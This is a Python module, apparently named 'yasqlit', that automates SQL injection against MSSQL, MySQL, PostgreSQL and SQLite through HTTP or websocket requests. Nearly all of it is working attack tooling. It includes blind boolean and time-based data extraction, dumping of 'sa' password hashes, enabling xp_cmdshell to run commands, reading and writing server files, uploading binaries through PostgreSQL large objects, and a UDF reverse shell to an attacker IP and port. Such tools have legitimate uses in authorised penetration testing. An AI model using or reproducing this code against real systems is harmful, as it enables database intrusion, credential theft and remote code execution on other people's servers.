#!/usr/bin/env python3
from itertools import product, chain
from functools import partial
import threading
import logging
import string
import base64
import queue
import enum
import json
import time
import sys
import re
import io

# HINT:
# if using vscode add the following in settings.json for tab-completion
# "python.analysis.extraPaths":[
#         "<PATH TO YASQLIT.PY FILE>"
# ]
#
# use -d flag to proxy use 127.0.0.1:8080 proxy and print debug info

# GLOBALS
templates = {
    'mssql': {
        # ========== MICROSOFT SQL ==========
        # https://hydrasky.com/network-security/mssql-server-injection-tutorial/
        'select': {
            'version': 'SELECT @@version',
            'user': 'SELECT SUSER_NAME()',
            'database': 'SELECT DB_NAME()',
            'tables': 'SELECT TABLE_NAME from INFORMATION_SCHEMA.TABLES',
            'tables2': 'SELECT name from sys.tables',
            'columns': "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table}'",
            'isShellEnabled': "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = 'xP_cmDshElL'",
            'hash2000': "SELECT master.dbo.fn_varbintohexstr(password) FROM master.dbo.sysxlogins WHERE name = 'sa'",
            'hash2005': "SELECT master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name = 'sa'",
            'boolExfil': "SELECT ASCII(SUBSTRING(({query}),{idx},1)) {operator} {guess}",  # might not with with SELECT ?
        },
        'util': {
            'comment': '-- ',
            'union': 'UNION ALL SELECT {query}',
            'order': 'ORDER BY {column}', # 1,2,3... to get num of columns
            'limit': 'ORDER BY 1 OFFSET {offset} ROWS FETCH NEXT {count} ROWS ONLY',
            'sleep': "WAITFOR DELAY '00:00:0{sec}'",
        },
        'stacked': {
            'enableShell': "EXEC sp_reconfigure 'show advanced options',1;EXEC sp_reconfigure 'xP_cmDshelL',1;RECONFIGURE",
            'createAndEmptyOutputTable': "IF (EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'tmpconfig')) TRUNCATE TABLE tmpconfig ELSE CREATE TABLE tmpconfig (id int IDENTITY(1,1) PRIMARY KEY, output varchar(1024))",
            # 'createAndEmptyOutputTable': "IF (EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'tmpconfig')) BEGIN DROP TABLE tmpconfig END CREATE TABLE tmpconfig (id int IDENTITY(1,1) PRIMARY KEY, output varchar(1024))",
            'shell': "INSERT INTO tmpconfig (output) EXEC xP_cmDshelL '{cmd}'"
        }
    },
    'mysql': {
        # ========== MYSQL ==========
        # mysql -u root -p
        # show databases; use x; show tables;
        # select concat('1337',' h@x0r') == select concat(0x31333337,0x206840783072)
        # select * from information_schema.user_privileges;
        # select user,password from mysql.user;
        'select': {
            'version': 'SELECT @@version',
            'user': 'SELECT user()',
            'database': 'SELECT database()',
            'length': 'SELECT length(({query})){operator}{guess}',
            'boolExfil': 'SELECT ascii(substring(({query}),{idx},1)) {operator} {guess}',
            'timeExfil': 'SELECT CASE WHEN ascii(substring(({query}),{idx},1)) {operator} {guess} THEN sleep({sec}) END',
            'tables': "SELECT table_name FROM information_schema.tables where table_schema not in ('information_schema', 'mysql', 'performance_schema')",
            'columns': 'SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "{table}"',
            'collation': 'SELECT COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "{table}" AND COLUMN_NAME = "{column}"',
        },
        'util': {
            'comment': '#',
            'sleep': 'sleep({sec})',
            'collate': '{column} COLLATE {collation} FROM {table}',
            'limit': 'LIMIT {startIdx},{count}'
        }
    },
    'psql': {
        # ========== POSTGRESQL ==========
        # psql -U postgres -P 15432
        # \l+; \c X; \dt+; \du
        # SELECT * FROM pg_catalog.pg_tables WHERE schemaname != 'pg_catalog' AND schemaname != 'information_schema';
        # STRING ENCODING:
        # SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69) == 'secunit' (not supported in all queries)
        # DOLLAR-QUOTE CONSTANTS:
        # select 'secunit' == select $$secunit$$ == select $TAG$secunit$TAG$
        # CONDITIONALS:
        # select case when (select ...)='on' then pg_sleep(10) end;
        # FILE READ/WRITE:
        # copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\wmiget.vbs$$;
        # version 9 and 10 RCE: https://github.com/attackercan/psql-mass-rce/blob/master/psql-mass-rce.py
        'select': {
            'version': 'SELECT version()',
            'user': 'SELECT user',
            'isSuperUser': "SELECT current_setting('is_superuser')", # 'on' needed for lo_* and psql v9-10 RCE
            'database': 'SELECT current_database()',
            'tables': "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'",
            'columns': "SELECT column_name FROM information_schema.columns WHERE table_name = '{table}'",
            'boolExfil': 'SELECT ascii(substr(({query}),{idx},1)) {operator} {guess}',
            'timeExfil': 'SELECT CASE WHEN(ascii(substr(({query}),{idx},1)) {operator} {guess}) THEN pg_sleep({sec}) END',
            'b64decode': "SELECT convert_from(decode('{b64}','base64'),'utf-8')",
        },
        'util': {
            'comment': '-- ',
            'comment2': '/* ',
            'sleep': 'pq_sleep({sec})',
            'writeLine': "COPY ({contentQry}) TO '{path}'", 
            'limit': 'LIMIT {count} OFFSET {startIdx}',      
            'cast': '::text'
        },
        'stacked': {
            'timeExfilFile': "DROP TABLE IF EXISTS tmpconf;CREATE TEMP TABLE tmpconf (content text);COPY tmpconf from '{path}';SELECT CASE WHEN(ascii(substr((SELECT content FROM tmpconf LIMIT 1 OFFSET {lineIdx}),{idx},1)){operator}{guess}) THEN pg_sleep({sec}) end",
            'exfilFile': "DROP TABLE IF EXISTS tmpconf;CREATE TEMP TABLE tmpconf (content text);COPY tmpconf from '{path}';SELECT ascii(substr((SELECT content FROM tmpconf LIMIT 1 OFFSET {lineIdx}),{idx},1)){operator}{guess}",
            'copy': "CREATE TEMP TABLE IF NOT EXISTS tmpconf (content text);COPY tmpconf from '{src}';COPY (SELECT content FROM tmpconf) TO '{dst}' (DELIMITER E'#', FORMAT CSV, NULL '', ENCODING 'UTF8')",
            # https://github.com/Dionach/pgexec
            'udfRevShell': "CREATE OR REPLACE FUNCTION revshell(text, integer) RETURNS integer AS '{path}','revshell' LANGUAGE C STRICT;select revshell('{ip}',{port})",
            '9_10_RCE': "CREATE TEMP TABLE IF NOT EXISTS backup_420420 (output text);COPY backup_420420 from program '{cmd}';SELECT output FROM backup_420420"
        },
        'advancedFileWrite':{
            'firstLine': "SELECT '' AS a ,0 AS b",
            'otherLines': "UNION ALL {lineQry} AS a,{idx} AS b",
            'endSort': "COPY(SELECT a FROM ({contentQry}) as x ORDER BY b OFFSET 1) TO '{path}'",
        },
        'lo': {
            'import': "SELECT lo_import('{src}', {id})",
            'export': "SELECT lo_export({id}, '{dst}')",
            'unlink': "SELECT lo_unlink({id})",
            'updatePage': "UPDATE pg_largeobject SET data=decode('{b64}','base64') WHERE loid={id} AND pageno={pageIdx}",
            'insertPage': "INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({id}, {pageIdx}, decode('{b64}','base64'))",

        }
    },
    'nosql':{
        ''
    },
    'sqlite':{
        'select':{
            'version':'SELECT sqlite_version()',
            # char(97) <==> unicode('a')
            'boolExfil': 'SELECT unicode(substr(({query}),{idx},1)) {operator} {guess}',
            'timeExfil': 'SELECT CASE WHEN unicode(substr(({query}),{idx},1)) {operator} {guess} THEN (SELECT 1 AND 1=LIKE("ABCDEFG",UPPER(HEX(RANDOMBLOB({sec}00000000/2))))) END',
            'tables':'SELECT tbl_name FROM sqlite_master WHERE type="table" and tbl_name not like "sqlite_%"',
            'columns': "SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='{table}'",
        },
        'util':{
            'comment':'-- ',
            'comment2':'/*',
            'limit':'limit {count} offset {startIdx}',
        }
    }
}
displayText = '' # text displayed in real-time during exfiltration
logger = logging.getLogger('yasqlit')
logging.basicConfig()

def loge(msg):
    logger.error(f"{esc.clear_line}{esc.left.format(1000)}[{esc.red}*{esc.end}] {msg}")

def logd(msg):
    logger.debug(f"{esc.clear_line}{esc.left.format(1000)}[{esc.yellow}*{esc.end}] {msg}")

def logi(msg):
    logger.info(f"{esc.clear_line}{esc.left.format(1000)}[{esc.yellow}*{esc.end}] {msg}")


class esc:
    black       = '\x1b[30m'
    blackBg     = '\x1b[40m'
    red         = '\x1b[31m'
    redBg       = '\x1b[41m'
    green       = '\x1b[32m'
    greenBg     = '\x1b[42m'
    yellow      = '\x1b[33m'
    yellowBg    = '\x1b[43m'
    blue        = '\x1b[34m' 
    blueBg      = '\x1b[44m' 
    magenta     = '\x1b[35m'
    magentaBg   = '\x1b[45m'
    cyan        = '\x1b[36m'
    cyanBg      = '\x1b[46m'
    white       = '\x1b[37m'
    whiteBg     = '\x1b[47m'
    
    up          = '\x1b[{}A'
    down        = '\x1b[{}B'
    right       = '\x1b[{}C'
    left        = '\x1b[{}D'

    clear_line  = '\x1b[2K'

    end = '\x1b[0m'

class unicode:
    spinner = ['⣾', '⣷', '⣯', '⣟', '⡿', '⢿', '⣻', '⣽']

class HttpClient:
    def __init__(self, protocol, rline, headers, body, ploc, debug=False):
        self.protocol = protocol
        self.request_line = rline
        self.headers = headers
        self.body = body
        self.payload_location = ploc
        self.session = HttpClient._initSession(debug)
    
    def build(self, payload):
        import requests
        import urllib.parse

        method, endpoint, _ = self.request_line.split(' ')
    
        if self.payload_location == 'url':
            url_encoded_payload = urllib.parse.quote_plus(payload)
            endpoint_formatted = endpoint.format(url_encoded_payload) 
        else:
            endpoint_formatted = endpoint
        if self.payload_location == 'body':
            body_formatted = self.body.format(requests.utils.quote(payload))
        else:
            body_formatted = self.body
        if self.payload_location != 'url' and self.payload_location != 'body':
            tmp = self.headers.copy()
            tmp = tmp[self.payload_location].format(payload)
            headers_formatted = tmp
        else:
            headers_formatted = self.headers

        return requests.Request(method, f'{self.protocol}://{self.headers["Host"]}{endpoint_formatted}', data=body_formatted, headers=headers_formatted)

    @staticmethod
    def _initSession(proxy=False):
        import requests
        import urllib3

        session = requests.session()
        if proxy:
            session.proxies.update({'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'})
        session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0'})
        session.verify = False
        urllib3.disable_warnings()
        # s.auth = ('user', 'pass')
        # s.headers.update({'x-test': 'true'})
        return session

    @staticmethod
    def parse(raw, useSsl=False, debug=False):
        if isinstance(raw, str):
            raw = io.StringIO(raw)
        payload_header = ''
        with raw as f:
            reqLine = f.readline()
            headers = {}
            while True:
                line = f.readline()
                if line.strip() == '':
                    break # Done parsing headers
                name, value = line.split(':',1)
                if name == 'Content-Length' or name == 'Accept' or name == 'Accept-Encoding' or name == 'Accept-Language':
                    continue # Skip, let requests handle these
                if '{}' in value:
                    payload_header = name
                headers[name] = value.strip()
            body = f.read()

            if '{}' in reqLine:
                ploc = 'url'
            elif payload_header != '':
                ploc = payload_header
            elif '{}' in body:
                ploc = 'body'
            else:
                logi(f'{esc.red}Error{esc.end}: no injection point ({{}}) found!')
                exit(-1)

        logd(f'request line = {reqLine}')
        logd(f'request headers = {json.dumps(headers, indent=4, sort_keys=True)}')
        if len(body) > 0: logd(f'request body = {body}')

        pReq =  HttpClient('https' if useSsl else 'http', reqLine, headers, body, ploc, debug)
        return pReq

# pip install websocket-client
class WebSocketClient(threading.Thread):
    def __init__(self, url, recvQ, senderThread, debug=False):
        import websocket

        threading.Thread.__init__(self)
        self._debug = debug
        self._recvQ = recvQ
        self._sender = senderThread
        self.connected = False
        self.ws = websocket.WebSocketApp(
            url,
            on_message = lambda ws, msg: self.recv(msg),
            on_error = lambda ws, err: self.onError(err),
            on_close = lambda ws: self.onClose(),
            on_open = lambda ws: self.onOpen()
        )

    def onOpen(self):
        logi("[WebsocketClient.onOpen]")
        self.connected = True
        self._sender.start()

    def recv(self, res):
        logd(f'[WebsocketClient.recv] res = {res}')
        self._recvQ.put(res)

    def onError(self, err):
        logi(f"[WebsocketClient.enError]  error = {err}")
        self.connected = False
        
    def onClose(self):
        logi("[WebsocketClient.onClose]")
        self.connected = False

    def run(self):
        import ssl
        if self._debug:
            # import websocket
            # websocket.enableTrace(True)
            self.ws.run_forever(http_proxy_host='localhost', http_proxy_port=8080, sslopt={"cert_reqs": ssl.CERT_NONE})
        else:
            self.ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})

class WorkerSender(threading.Thread):
    def __init__(self, transport):
        threading.Thread.__init__(self)
        self._transport = transport
    
    def run(self):
        while True:
            msg = self._transport.sendQ.get()
            if type(self._transport.client) is HttpClient:
                logd(f'[WorkerSender] http msg = {msg}')
                r = self._transport.client.build(msg)
                success = False
                while not success:
                    try:
                        res = self._transport.client.session.send(self._transport.client.session.prepare_request(r), allow_redirects=False)
                        success = True
                    except Exception as e:
                        logi(f'[WorkerSender] failed to send request... \n{e}')
                        time.sleep(20)
                self._transport.recvQ.put(res)
            elif type(self._transport.client) is WebSocketClient:
                logd(f'[WorkerSender] ws msg = {msg}')
                self._transport.client.ws.send(msg)
            else:
                logi(f'{esc.red}unknown client protocol!{esc.end}')
                exit(-1)

class Transport:
    def __init__(self, payloadProcessor=None, responseProcessor=None, predicate=None, requestPath=None, wsUrl=None, useSsl=False):
        debug = True if '-d' in sys.argv else False

        if debug is True:
            logger.setLevel(logging.DEBUG)
        else:
            logger.setLevel(logging.INFO)
        self.payloadProcessor = payloadProcessor
        self.responseProcessor = responseProcessor
        self.predicate = predicate
        self.sendQ = queue.Queue()
        self.recvQ = queue.Queue()
        self.client = None
        sender = WorkerSender(self)
        sender.daemon = True
        if requestPath is not None:
            sender.start()
            with open(requestPath, 'r') as f:
                client = HttpClient.parse(f.read(), useSsl=useSsl, debug=debug)
        elif wsUrl is not None:
            client = WebSocketClient(wsUrl, self.recvQ, sender, debug=debug)
            client.daemon = True
            client.start()
        else:
            logi(f'{esc.red} missing both requestPath (for http client) and wsData (for websocket client){esc.end}')
            exit(-1)
        self.client = client

    def send(self, payload):
        logd(f'[Transport.send] payload = {payload}')
        if self.payloadProcessor is not None:
            payload = self.payloadProcessor(payload)
        self.sendQ.put(payload)
        res = self.recvQ.get()
        if self.predicate is not None:
            predicate = self.predicate(res)
        if self.responseProcessor is not None:
            res = self.responseProcessor(res)
        if logger.getEffectiveLevel() == logging.DEBUG:
            logd(f'res = {res}')
            if self.predicate is not None:
                logd(f'predicate = {predicate}')
        return res

def decoratorPrettyPrint(func):
    def func_wrapper(*args, **kwargs):
        global displayText
        global tick
        
        displayText = ''
        tick = 1
        sys.stdout.flush()
        _startLoadingAnimation()
        
        start = time.time()
        ret = func(*args, **kwargs)

        tick = -1
        countLines = len(displayText.split('\n'))-1
        for _ in range(countLines):
            sys.stdout.write(esc.clear_line)
            sys.stdout.write(esc.up.format(1))
        sys.stdout.write(esc.clear_line)
        sys.stdout.write(esc.left.format(1000))
        if kwargs.get('prettyPrintResult', True):
            sys.stdout.write(f"[{esc.green}+{esc.end}] {ret}\n")
        if logger.getEffectiveLevel() == logging.DEBUG:
            sys.stdout.write(f'[{esc.yellow}*{esc.end}] time: {time.time()-start}\n')
        sys.stdout.flush()
        return ret
    return func_wrapper

def generate(length, charSet):
    word = product(charSet, repeat=length)
    for attempt in word:
        parts = [''.join(part) for part in chain(attempt)]
        yield ''.join(parts)

class BoolExfiltrateType(enum.Enum):
    # query needs placeholders for: idx, operator, guess
    ITERATIVE = 1
    # query needs placeholders for: operator, guess
    LIKE = 2
    # query needs placeholders for: idx, operator, guess
    BINARY = 3
    # query needs placeholders for: guess (use from list exfil)
    NOSQL = 4 

@decoratorPrettyPrint
def boolExfiltrate(transport, query, dbms, searchChars=string.printable, timeBasedDelay = None, exfilType=BoolExfiltrateType.BINARY, prettyPrintResult=True):
    """
    Parameters
    ----------
    transport : Transport
        the transport class instance responsible for sending and receiving data
    query : string
        the SQL query from which the resulting data will be exfiltrated, 
        the query should be crafted to limit a single result and project a single column
    dbms : string
        the backend database management system,
    searchChars : string, optional
        a string containing all the possible chars that can occur in result,
        by default all printable ascii chars
    timeBasedDelay : int, optional
        if predicate is time based, this value should contains the number of seconds to delay

    Returns
    -------
    string
        the exfiltrated data
    """    
    global displayText
    idx = 1
    lChr = list(searchChars)
    lChr.sort()
    if type(query) is str:
        logi(f'exfiltrating result of query = {query}')
        if timeBasedDelay is None:
            partialTemplate = partial(templates[dbms]['select']['boolExfil'].format, query=query)
        else:
            partialTemplate = partial(templates[dbms]['select']['timeExfil'].format, query=query, sec=timeBasedDelay)
    else: # query is already partial
        partialTemplate = query

    while True:
        # iterative search with idx
        if exfilType == BoolExfiltrateType.ITERATIVE:
            found = False
            for ch in lChr:
                res = transport.send(partialTemplate(idx=idx, operator='=', guess=ord(ch)))
                if not transport.predicate(res): continue
                displayText += ch
                idx += 1
                found = True
                break
            if not found: break 
        # iterative search without idx
        elif exfilType == BoolExfiltrateType.LIKE:
            found = False
            if '%' in lChr: lChr.remove('%')
            for ch in lChr:
                displayText = f'{displayText}{ch}'
                withPercentEnding = f'{displayText}%'
                res = transport.send(partialTemplate(operator='LIKE 0x', guess=withPercentEnding.encode('utf-8').hex()))
                if not transport.predicate(res):
                    displayText = displayText[:-1]
                    continue
                found = True
                break
            if not found: break
        # binary search
        elif exfilType == BoolExfiltrateType.BINARY:
            partialTemplate = partial(partialTemplate, idx=idx)
            hit = _binarySearch(transport, partialTemplate, lChr, 0, len(lChr)-1)
            if hit == -1: break
            displayText += lChr[hit]
            idx += 1
        # nosql, without operator, finds additional character in nosql regex
        elif exfilType == BoolExfiltrateType.NOSQL:
            for ch in lChr:
                guess = partialTemplate(guess=ch)
                displayText = guess
                guess = re.escape(guess)
                res = transport.send(guess)
                if not transport.predicate(res):
                    displayText = displayText[:-1]
                    continue
                break
            break

    return displayText

def boolExfiltrateList(transport, query, dbms, searchChars=string.printable, timeBasedDelay = None, exfilType=BoolExfiltrateType.BINARY):
    resultArr = []
    idx = 0
    # special nosql recursive exfil type (needs regex in param)
    if exfilType == BoolExfiltrateType.NOSQL:
        foundChrs = []
        lChr = list(searchChars)
        lChr.sort()
        tmpSearchChars = searchChars
        while True:
            foundSoFar = boolExfiltrate(transport, query, dbms, searchChars=tmpSearchChars, exfilType=exfilType, prettyPrintResult=False)
            foundChr = foundSoFar[-1:]
            if foundChr in foundChrs or foundSoFar == query(guess=''): break
            foundChrs.append(foundChr)
            tmpSearchChars = searchChars.replace(foundChr, '')
        if len(foundChrs) == 0:
            print(f'[{esc.green}+{esc.end}] {foundSoFar}')
            resultArr.append(foundSoFar)
            return resultArr
        for ch in foundChrs:
            # escape more special fucking characters
            escapedQry = query(guess=ch).replace('{', '{{').replace('}', '}}')
            newQry = partial(f'{escapedQry}{{guess}}'.format)
            listSoFar = boolExfiltrateList(transport, newQry, dbms, searchChars=searchChars, timeBasedDelay=timeBasedDelay, exfilType=exfilType)
            resultArr += listSoFar
    # standard LIMIT increment sql exfil type
    else:
        while True:
            limitedQ = f"{query} {templates[dbms]['util']['limit'].format(startIdx=idx, count=1)}"
            result = boolExfiltrate(transport, limitedQ, dbms, timeBasedDelay=timeBasedDelay)
            if result is None or result == '': break
            resultArr.append(result)
            idx += 1
    return resultArr

### PSQL HELPER FUNCTIONS ###
def psqlExfiltrateFileLine(transport, path, lineIdx=0, timeBasedDelay=None):
    if timeBasedDelay is not None:
        pTemp = partial(templates['psql']['stacked']['timeExfilFile'].format, path=path, lineIdx=lineIdx, sec=timeBasedDelay)
    else:
        pTemp = partial(templates['psql']['stacked']['exfilFile'].format, path=path, lineIdx=lineIdx)
    return boolExfiltrate(transport, pTemp, 'psql', timeBasedDelay=timeBasedDelay)

def psqlSaveFile(transport, rawStr, dst):
    cQry = templates['psql']['advancedFileWrite']['firstLine']
    for idx, line in enumerate(rawStr.split('\n')):
        line = line.replace('\t','    ')
        line = line.replace('\r','')
        tmp = str(base64.b64encode(line.encode('utf-8')), 'utf-8')
        encoded = templates['psql']['select']['b64decode'].format(b64=tmp)
        cQry += ' ' + templates['psql']['advancedFileWrite']['otherLines'].format(lineQry=encoded, idx=idx)
    # print(cQry)
    payload = templates['psql']['advancedFileWrite']['endSort'].format(contentQry=cQry, path=dst)
    transport.send(payload)

def psqliSaveFileLine(transport, line, dst):
    b64 = base64.b64encode(line.encode('utf-8')).decode('utf-8')
    cQry = templates['psql']['select']['b64decode'].format(b64=b64)
    payload = templates['psql']['util']['writeLine'].format(contentQry=cQry, path=dst)
    transport.send(payload)

def psqlCopyLocalFile(transport, src, dst, type='lo'):
    if type == 'lo':
        copy = f"{templates['psql']['lo']['import']};{templates['psql']['lo']['export']};{templates['psql']['lo']['unlink']}"
        payload = copy.format(src=src, dst=dst, id=421421)
    else:
        payload = templates['psql']['stacked']['copy'].format(src=src, dst=dst)
    transport.send(payload)

def psqlUdfRevShell(transport, src, dst, ip, port, existingSmallFile='/etc/hosts'):
    psqlSaveBinFile(transport, src, dst, existingSmallFile=existingSmallFile)
    payload = templates['psql']['stacked']['udfRevShell'].format(path=dst, ip=ip, port=port)
    transport.send(payload)

def psqlSaveBinFile(transport, srcPath, dstPath, existingSmallFile='/etc/hosts', loId=421421, pageSize=2048):
    # https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql
    # select loid, pageno, encode(data, 'escape') from pg_largeobject;\
    # good candidate for existing small file on windows is c:\Windows\win.ini

    payload = templates['psql']['lo']['import'].format(src=existingSmallFile, id=loId)
    transport.send(payload)

    with open(srcPath, 'rb') as f:
        pageIdx = 0
        while True:
            page = f.read(pageSize)
            if not page: break
            b64 = str(base64.b64encode(page), 'utf-8')
            if pageIdx == 0:
                payload  = templates['psql']['lo']['updatePage'].format(b64=b64, pageIdx=pageIdx, id=loId)
            else:
                payload  = templates['psql']['lo']['insertPage'].format(b64=b64, pageIdx=pageIdx, id=loId)
            transport.send(payload)
            pageIdx += 1

    payload = f"{templates['psql']['lo']['export']};{templates['psql']['lo']['unlink']}".format(dst=dstPath, id=loId)
    transport.send(payload)

### MSSQL HELPER FUNCTIONS ###
def mssqlGetQueryResultLen(transport, qry):
    size = 1
    while True:
        payload = templates['mysql']['select']['length'].format(query=qry, length=size)
        res = transport.send(payload)
        if transport.predicate(res): break
        size += 1
    logi(f'{qry} => length = {size}')
    return size

def mssqlShell(transport, cmd):
    transport.send(templates['mssql']['stacked']['enableShell'])
    transport.send(templates['mssql']['stacked']['createAndEmptyOutputTable'])
    transport.send(templates['mssql']['stacked']['shell'].format(cmd=cmd))

def mssqlExfilShell(transport):
    count = transport.send('SELECT count(*) FROM tmpconfig')
    for idx in range(1,int(count)):
        qry = f"SELECT TOP 1 output FROM tmpconfig WHERE id={idx}"
        res = transport.send(qry)
        if res is not None:
            print(f'{res}')
        else:
            print()
        idx += 1

### INTERNAL FUNCTIONS ###

def _binarySearch(transport, partialTemplate, searchChars, low, high):

    if low > high:
        return -1
    if low == high:
        return low
    if low+1 == high:
        payload = partialTemplate(guess=ord(searchChars[low]), operator='=')
        res = transport.send(payload)
        if transport.predicate(res):
            return low
        payload = partialTemplate(guess=ord(searchChars[high]), operator='=')
        res = transport.send(payload)
        if transport.predicate(res):
            return high
        return -1

    mid = (low + high) // 2
    # print(f"low:{low} | high:{high} | mid:{mid} | slice:{searchChars}")
    # BETWEEN EXCLUSIVE AND INCLUSIVE

    payload = partialTemplate(operator='BETWEEN', guess=f'{ord(searchChars[mid+1])} AND {ord(searchChars[high])}')
    res = transport.send(payload)
    if transport.predicate(res):
        return _binarySearch(transport, partialTemplate, searchChars, mid+1, high)
    
    payload = partialTemplate(operator='BETWEEN', guess=f'{ord(searchChars[low])} AND {ord(searchChars[mid-1])}')
    res = transport.send(payload)
    if transport.predicate(res):
        return _binarySearch(transport, partialTemplate, searchChars, low, mid-1)
    
    payload = partialTemplate(guess=ord(searchChars[mid]), operator='=')
    res = transport.send(payload)
    if transport.predicate(res):
        return mid

    return -1

def _startLoadingAnimation():
    global tick
    global displayText
    if tick == -1: return
    t = threading.Timer(0.3, _startLoadingAnimation)
    t.daemon = True
    t.start()
    countLines = len(displayText.split('\n'))-1
    for _ in range(countLines):
        sys.stdout.write(esc.clear_line)
        sys.stdout.write(esc.up.format(1))
    sys.stdout.write(f"{esc.clear_line}{esc.left.format(1000)}[{esc.red}{unicode.spinner[tick%len(unicode.spinner)]}{esc.end}] {displayText}")
    sys.stdout.flush()
    tick += 1

if __name__ == '__main__':
    logi('use as module, check examples...')
    logi('import yasqlit as ya')